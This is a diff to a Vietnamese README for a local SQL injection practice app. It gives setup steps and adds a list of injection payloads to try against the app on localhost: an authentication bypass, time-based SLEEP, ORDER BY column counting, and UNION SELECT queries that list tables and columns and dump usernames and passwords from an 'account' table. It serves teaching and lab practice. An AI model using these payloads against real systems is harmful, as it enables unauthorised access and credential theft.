@@ -1,7 +1,7 @@
 1. Cài ứng dụng
-    Nodejs
-    MySql
-    Vscode
+    - Nodejs
+    - MySql
+    - Vscode
 
 2. Vào ứng dụng MySql và tạo một database "sql_injection"
 
@@ -12,8 +12,21 @@
 5. Mở terminal (cmd)
 
 6. Gõ lệnh: 
-    npm install --global yarn
-    yarn
-    yarn start
+    - npm install --global yarn
+    - yarn
+    - yarn start
 
-7. Note: Trường hợp xảy ra lỗi khi chạy "yarn start" xem tại link "https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server" 
+7. Mở trình duyệt với url: "http://localhost:3000"
+
+8. Các câu lệnh tấn công thử trên web:
+    - ' OR 1 = 1 --
+    - ' AND SLEEP(1) --
+    - ' ORDER BY 4 --
+    - ' ORDER BY 5 --
+    - ' UNION SELECT 1, 2, 3, 4 --
+    - ' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() -- ' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'account' --
+    - ' UNION SELECT id, password, username, 4 FROM account --
+
+9. Note:
+    - Trường hợp xảy ra lỗi khi chạy "yarn start" xem tại link "https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server"
+    - Đằng sau mỗi dấu -- ở phần 8 luôn có 1 dấu cách
